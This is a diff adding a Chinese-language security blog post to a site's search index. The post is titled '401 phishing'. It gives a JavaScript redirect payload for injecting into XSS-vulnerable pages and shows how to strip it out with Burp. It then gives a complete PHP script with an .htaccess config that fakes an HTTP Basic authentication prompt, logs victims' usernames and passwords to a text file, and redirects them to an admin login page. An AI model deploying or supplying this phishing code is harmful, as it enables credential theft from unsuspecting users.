@@ -79,6 +79,31 @@
     
     
     <entry>
+      <title>401钓鱼</title>
+      <link href="/posts/25443.html"/>
+      <url>/posts/25443.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="一、XSS-URL-跳转"><a href="#一、XSS-URL-跳转" class="headerlink" title="一、XSS URL 跳转"></a>一、XSS URL 跳转</h3><p>测试账号：13140000000<br>JS跳转代码：</p><pre><code>&lt;script language="JavaScript" type="text/javascript"&gt;window.location.href='YOU URL'; &lt;/script&gt;</code></pre><p>当我们将其插入到有XSS漏洞的地方，网页会立马跳转到我们的网页</p><p>那么如何去掉反弹，让网页不在跳转到其它页面呢？？</p><p>首先开启BURP抓包，然后进入含有我们插入XSS URL恶意跳转的页面，进行抓包拦截；单击右键-Do intercept-response to this request （抓取返回包） 接着点击 放过 ；等待BURP抓取返回包（服务器传输给客户端的数据包）在返回包里找到我们那段代码将其删除，这样网页就不会跳转了；最后在最初我们插入XSS跳转代码的地方，将这段恶意代码彻底的删除。这样就OK了。</p><p><strong>图文过程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115758.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115759.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115800.png" alt=""></p><p><strong>去掉反弹跳转过程</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115801.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115804.png" alt=""></p><p>响应包：</p><p>思路：在响应包里找到我们插入的恶意代码，将其删除，并且放过数据包。从而不让客户端跳转到其他页面。进而回到客户端添加代码的地方，将其永久删除。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115805.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115802.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115803.png" alt=""></p><p>完成。</p><h3 id="二、401登录认证钓鱼"><a href="#二、401登录认证钓鱼" class="headerlink" title="二、401登录认证钓鱼"></a>二、401登录认证钓鱼</h3><p>首先代码：保存为1.php</p><pre><code>&lt;?phpif(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW'])) {    Header("WWW-Authenticate: Basic realm=\"USER LOGIN\"");    Header("HTTP/1.0 401 Unauthorized");} else {    @file_put_contents('./b4dboy.txt', $_SERVER['PHP_AUTH_USER'].'|'.$_SERVER['PHP_AUTH_PW']."\r\n", FILE_APPEND);    header("Location: http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login");}?&gt;开启401</code></pre><p>接着创建文件 .htaccess 写入内容</p><pre><code>Options +FollowSymlinks -Multiviews RewriteEngine On #Authorization Headers RewriteCond %{HTTP:Authorization} ^(.+)$ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>快速查看端口被谁占用了</title>
       <link href="/posts/30324.html"/>
       <url>/posts/30324.html</url>
